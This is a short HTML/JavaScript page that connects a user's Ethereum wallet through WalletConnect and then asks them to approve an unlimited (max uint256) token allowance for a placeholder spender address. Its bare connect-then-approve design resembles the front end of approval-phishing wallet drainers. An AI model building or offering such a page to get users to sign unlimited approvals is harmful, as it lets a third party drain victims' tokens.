<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WalletConnect v2 Approve</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
</head>
<body>
  <h1>Conne2ct Wallet & Approve</h1>
  <button id="connectButton">Connect Wallet</button>
  <p id="status">Not connected</p>
  <button id="approveButton" style="display:none;">Approve Tokens</button>

  <script type="module">
    import EthereumProvider from "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider/dist/esm/index.js";

    let provider;
    let web3;
    let accounts = [];

    const connectWallet = async () => {
      provider = await EthereumProvider.init({
        projectId: "YOUR_PROJECT_ID", // Get it from https://cloud.walletconnect.com
        chains: [1], // Mainnet
        showQrModal: true
      });

      await provider.enable();
      web3 = new Web3(provider);
      accounts = await web3.eth.getAccounts();

      document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
      document.getElementById("connectButton").style.display = "none";
      document.getElementById("approveButton").style.display = "inline-block";
    };

    const approveTokens = async () => {
      const tokenAddress = "0xTokenAddress"; // замените на нужный токен
      const spender = "0xSpenderAddress";   // кто получит право тратить токены

      const abi = [
        {
          constant: false,
          inputs: [
            { name: "_spender", type: "address" },
            { name: "_value", type: "uint256" }
          ],
          name: "approve",
          outputs: [{ name: "", type: "bool" }],
          type: "function"
        }
      ];

      const tokenContract = new web3.eth.Contract(abi, tokenAddress);
      const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

      try {
        await tokenContract.methods.approve(spender, maxUint).send({ from: accounts[0] });
        alert("Approve successful!");
      } catch (err) {
        console.error("Approve error:", err);
        alert("Approve failed");
      }
    };

    document.getElementById("connectButton").addEventListener("click", connectWallet);
    document.getElementById("approveButton").addEventListener("click", approveTokens);
  </script>
</body>
</html>
